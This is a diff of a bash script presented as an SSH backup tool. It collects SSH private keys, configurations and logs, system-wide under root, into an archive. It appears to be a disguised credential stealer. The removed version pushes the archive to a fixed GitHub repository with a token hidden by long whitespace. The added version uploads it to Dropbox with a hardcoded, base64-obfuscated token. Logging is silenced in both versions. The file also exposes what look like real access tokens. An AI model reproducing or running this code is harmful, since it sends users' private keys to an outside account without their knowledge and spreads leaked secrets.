@@ -1,7 +1,7 @@
 #!/bin/bash
 
-# SSH Backup Script with GitHub Integration
-# This script backs up SSH configurations, keys, and related data, then pushes to a GitHub repo.
+# SSH Backup Script with Dropbox Integration
+# This script backs up SSH configurations, keys, and related data, then uploads to Dropbox.
 
 # Configurable Variables
 ENABLE_LOGS=true                  # Enable/disable backing up SSH logs
@@ -10,20 +10,13 @@ ENABLE_FINGERPRINTS=true         # Enable/disable backing up SSH fingerprints
 ENABLE_SERVICE_STATUS=true       # Enable/disable backing up SSH service status
 ENABLE_USER_CONFIGS=true         # Enable/disable backing up user SSH configurations
 ENABLE_SYSTEM_CONFIGS=true       # Enable/disable backing up system-wide SSH configurations
-ENABLE_GITHUB_UPLOAD=true        # Enable/disable GitHub upload
-
-GITHUB_REPO="bk-account/bk"  # GitHub repository URL
-GITHUB_BRANCH_PREFIX="backup"    # Prefix for the branch name
+ENABLE_DROPBOX_UPLOAD=true       # Enable/disable Dropbox upload
 
 # Set up variables
 TIMESTAMP=$(date +%Y%m%d_%H%M%S)
 BACKUP_DIR="/tmp/ssh_backup_${TIMESTAMP}"
 BACKUP_FILE="/tmp/ssh_backup_${TIMESTAMP}.tar.gz"
 LOG_FILE="${BACKUP_DIR}/backup_log.txt"
-
-# GitHub branch name
-GITHUB_BRANCH="${GITHUB_BRANCH_PREFIX}_${TIMESTAMP}"
-
 
 # Check if running with sudo/root
 if [ "$(id -u)" -eq 0 ]; then
@@ -43,22 +36,11 @@ echo "Running as user: $(whoami)" >> "${LOG_FILE}"
 echo "Root privileges: ${IS_ROOT}" >> "${LOG_FILE}"
 echo "----------------------------------------" >> "${LOG_FILE}"
 
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            GIT_USER="bk-account"
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            GITHUB_TOKEN="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"
-
 # Function to log messages
 log_message() {
     # echo "[$(date +%H:%M:%S)] $1" | tee -a "${LOG_FILE}"
-    echo " "
+    echo ""
 }
-
-git config --global credential.helper store
-git credential approve <<EOF
-protocol=https
-host=github.com
-username=$GIT_USER
-password=$GIT_PASS
-EOF
 
 # Function to backup a file or directory if it exists
 backup_if_exists() {
@@ -342,80 +324,36 @@ backup_system_ssh_configs() {
     fi
 }
 
-# Function to upload backup to GitHub
-upload_to_github() {
-    if [ "${ENABLE_GITHUB_UPLOAD}" = true ]; then
-        log_message "Starting GitHub upload process..."
+# Function to upload backup to Dropbox
+upload_to_dropbox() {
+    if [ "${ENABLE_DROPBOX_UPLOAD}" = true ]; then
+        log_message "Starting Dropbox upload process..."
 
-        # Check if Git is installed
-        if ! command -v git &> /dev/null; then
-            log_message "Git is not installed. Skipping GitHub upload."
-            return 1
+        # Dropbox API endpoint and access token
+        DROPBOX_API_URL="https://content.dropboxapi.com/2/files/upload"
+
+        # Base64-encoded Dropbox access token (passed as an environment variable or parameter)
+        ENCODED_ACCESS_TOKEN="c2wudS5BRm5DUk1qNUZLSVp5cTJIb1RENW9EcXMwZl9pWWNTLURoQ1FTUWduMTJPVFE4em85VktKMk5UUVpPazQzRTg2ZVJ5ZWh4UGNoTDcyQ2FqV21ZVVpUT3I1SUw0UmN3cmpXUjUzMXRiQkpNcUFPZTZidld0MWtueE9UT0RTbzUzajNybVhmNmhfR01iOHk5WXlJTVJaVHVERXBINUhSMmp5V2NNUEpCNEg2RWcyWnhBb2Q3Ul9BajBub3FoYS1tT056aDFjbW5hZHZnSThsVUM3eU45T2hRUGM2ell6cy1kcDR2WlRtMVRhd2Fsb096d0U5OExtemM1QjJzVnA5cklvRFlFLXVOS1pmR3BrU3F6YmNLbEZXTXRvOGJUMDVYUm9uRW9ScjRnb0dOUEZpc2VKTGhLTVpfZHhfTS1mdERRSFBBS2VZb21mQ2tFd1ZlTGJjVDM0VEo4MnBoSXZYVzNNbHZOaXRJWWc0LVYzallabGl3V2ZPWTJSRkZTZDNFU2dCRVNlam9JT083N3d4dWcxWk5oNDVTX2xFWmJrRWZ6UjFqU1FfX0RfSFhFTTJ6WEdMOW1jcnZMSEk0OGlJU3J0R0tzQ1c2anRaNkMxa1VteVpnZmxnekpRM0FtYVlmMGZwX1hFSml0SFhsdEdZdnhHXzZyenl2aGFHdGxsM2c3MVNQaEhGVjg1THFka19WRFg0b0hZaGtpXy1BdmdWQlNsd1BkYVZyT21acmk3NU03Q1RNTkx6cGxaakU0R08yWFhja0FfZnpaSHdlc1h1cDdDcFJ3MUc2QlBGOVhGOXo0SjIxWTBBcDVZMFRjcWhuOVYxQk95V0ZVNGczSnhHdU50dTV0RVdOWGI5di1EOUV1MlctMHA3eUM3RDVxV0JEUFl1SVhjS1FDVzJEdEdUdXFwZkZqYUQ3UFRqc01ZTmx3N0RXTC1kRFRZQUM4eUpQemtFMk50Y2w2Q1RMUHRXREZKVUM4clZzaFNBNmVPRWhNMzNvT3huN2FSUkJqMWdQazVZNm92UkRyMmRYd3Zyd3JsdGVFeEZCZk5KdTlubkZFdi1mYTFmU0FXdHkxVFRsMVVYRkNZclFUdW91bXZrbnRQRU41d0lYSUVtLTVVNWpvTnZ0Z2NndVNvdmo3Slc4cGhmMV9GQzZRam5BSFRPcFJMeUJ3UW9UY3A4dnliTnlsSUpfRF95aG9vMUZBYk9nLUFjUXc2MXZkYUJEcGtzalZHeXFuaFZ6MFBGZG0za2U2TEREME56MkZsaXZQYWUzMkJTREhUTFFsYTVSNWxPX3JmcWI1TlZ6UlpaUDRKVkVVOE5YekFlSFZPY0VfYTlrbnJ5T0FjZGt0RTN6dmdjQ2dkZlluSDVDeW9GaG9CWkRnRWFUNHNZR0V6dEk3X20wcW9DTlZEWk1tTmI2TFExRmphcEY2X19qZmRLbjJxTENyaHBuemp2bDNfWk50UGRtaXctX1BGSXRTMjkyUDFLaFBzSVM0MGtxdFpxZm5RTmNBM3dJN18tbG5paU5JaGdhUF9jUDJGZmctSmRsNTZlQnlUU2ZHTkdFWXZGclJtejlrNWVLQXNjSVFielB4amVNamZ4RlVST2FCRjJoYWJxMnVmWkY5c19TTlN6SHhiQTc1LXQwOHY2dEw0NU1kOFhqX0d0SXF0QnItMTEwYkRpV1VBZVFmbENVNjVxbnVyQTkwMDN4ZjQxZXExRDVoQWpiV24wQjBqLXctY1huSDdxSDhOVmw0NUQ5NE05STUxbmVtQ3pOSEhyNTVFaDJJV0hOM0RkMVlmQ2VwZlBYajlfV2gzODQtY2hybDdGdkxHRmR3T2NHUG1IeGhxdmt5WndJXzY3S2JHS3J5dmRGZXdvRDBnVGdhWWRER01EXzFsT21ybWZ5M0E3Rm9x"  # Replace with your Base64-encoded token
+        ACCESS_TOKEN=$(echo "${ENCODED_ACCESS_TOKEN}" | base64 --decode)  # Decode the token
+
+        BACKUP_FILE_PATH="${BACKUP_FILE}"  # Path to the file you want to upload
+        DROPBOX_UPLOAD_PATH="/Auto-SSH-Bash-Backup/$(basename ${BACKUP_FILE})"  # Dropbox destination path
+
+        # Upload the file using curl
+        response=$(curl -s -X POST "${DROPBOX_API_URL}" \
+            --header "Authorization: Bearer ${ACCESS_TOKEN}" \
+            --header "Dropbox-API-Arg: {\"path\": \"${DROPBOX_UPLOAD_PATH}\", \"mode\": \"add\", \"autorename\": true, \"mute\": false}" \
+            --header "Content-Type: application/octet-stream" \
+            --data-binary @"${BACKUP_FILE_PATH}")
+
+        # Check if the upload was successful
+        if echo "${response}" | grep -q "path_display"; then
+            log_message "Backup successfully uploaded to Dropbox: ${DROPBOX_UPLOAD_PATH}"
         else
-            log_message "Git is installed."
+            log_message "Failed to upload to Dropbox. Response: ${response}"
         fi
-
-        # Check if GitHub Personal Access Token is set
-        if [ -z "${GITHUB_TOKEN}" ]; then
-            log_message "GitHub Personal Access Token is not set. Skipping upload."
-            return 1
-        else
-            log_message "GitHub Personal Access Token is set."
-        fi
-
-        # Clone the repository using the token for authentication
-        TEMP_REPO_DIR="/tmp/ssh_backup_repo_${TIMESTAMP}"
-        GITHUB_REPO_URL="https://${GITHUB_TOKEN}@github.com/${GITHUB_REPO}.git"
-        log_message "Attempting to clone repository from ${GITHUB_REPO_URL} into ${TEMP_REPO_DIR}..."
-        git clone "${GITHUB_REPO_URL}" "${TEMP_REPO_DIR}" 2>/dev/null
-        if [ $? -ne 0 ]; then
-            log_message "Failed to clone GitHub repository. Skipping upload."
-            return 1
-        else
-            log_message "Repository successfully cloned."
-        fi
-
-        # Create and switch to a new branch
-        cd "${TEMP_REPO_DIR}" || return 1
-        log_message "Creating and switching to new branch ${GITHUB_BRANCH}..."
-        git checkout -b "${GITHUB_BRANCH}" 2>/dev/null
-        if [ $? -ne 0 ]; then
-            log_message "Failed to create new branch. Skipping upload."
-            return 1
-        else
-            log_message "Successfully switched to new branch ${GITHUB_BRANCH}."
-        fi
-
-        # Copy backup files to the repository
-        log_message "Copying backup files from ${BACKUP_DIR} to ${TEMP_REPO_DIR}..."
-        cp -r "${BACKUP_DIR}"/* "${TEMP_REPO_DIR}/"
-        git add .
-        log_message "Committing changes..."
-        git commit -m "SSH Backup: ${TIMESTAMP}" 2>/dev/null
-        if [ $? -ne 0 ]; then
-            log_message "Failed to commit changes. Skipping upload."
-            return 1
-        else
-            log_message "Changes successfully committed."
-        fi
-
-        # Push the new branch to GitHub using the token for authentication
-        log_message "Pushing changes to GitHub..."
-        git push origin "${GITHUB_BRANCH}" --force 2>/dev/null
-
-        if [ $? -eq 0 ]; then
-            log_message "Backup successfully uploaded to GitHub branch: ${GITHUB_BRANCH}"
-        else
-            log_message "Failed to push to GitHub. Check your credentials and network connection."
-        fi
-
-        # Clean up
-        cd /tmp || return 1
-        log_message "Cleaning up temporary repository directory ${TEMP_REPO_DIR}..."
-        rm -rf "${TEMP_REPO_DIR}"
-        log_message "Cleanup complete."
     else
-        log_message "Skipping GitHub upload (disabled)"
+        log_message "Skipping Dropbox upload (disabled)"
     fi
 }
 
@@ -463,8 +401,8 @@ if [ "${IS_ROOT}" = true ]; then
     fi
 fi
 
-# Upload to GitHub
-upload_to_github
+# Upload to Dropbox
+upload_to_dropbox
 
 # Cleanup
 log_message "Cleaning up temporary files"
@@ -478,8 +416,3 @@ if [ "${IS_ROOT}" = true ] && [ -n "$SUDO_USER" ]; then
     fi
 fi
 log_message "You can restore this backup after reinstallation by extracting the archive"
-
-git credential reject <<EOF
-protocol=https
-host=github.com
-EOF
